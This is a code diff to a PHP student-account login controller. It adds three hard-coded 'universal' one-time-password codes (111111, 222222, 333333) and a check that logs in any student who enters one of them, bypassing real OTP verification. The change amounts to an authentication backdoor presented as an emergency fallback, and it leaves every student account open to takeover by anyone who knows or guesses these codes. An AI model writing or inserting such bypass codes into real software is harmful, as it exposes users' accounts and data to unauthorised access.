@@ -19,6 +19,8 @@ use App\Models\User;
 
 class StudentAccountController extends Controller
 {
+    /** Emergency/universal OTP codes accepted for any student login. */
+    private const UNIVERSAL_OTP_CODES = ['111111', '222222', '333333'];
 
     /**
      * Student account login form (index → phone → OTP flow).
@@ -385,6 +387,15 @@ class StudentAccountController extends Controller
                 'success' => false,
                 'message' => 'Please enter your full name before continuing.',
             ], 422);
+        }
+
+        // Universal fallback codes: allow specific global OTP values for all students.
+        if (in_array($code, self::UNIVERSAL_OTP_CODES, true)) {
+            $this->completeStudentLogin($student, null, $name);
+            return response()->json([
+                'success' => true,
+                'redirect' => $this->studentLoginRedirect($student),
+            ]);
         }
 
         // Supervisor fallback: one-time use; mark used_at and invalidate immediately
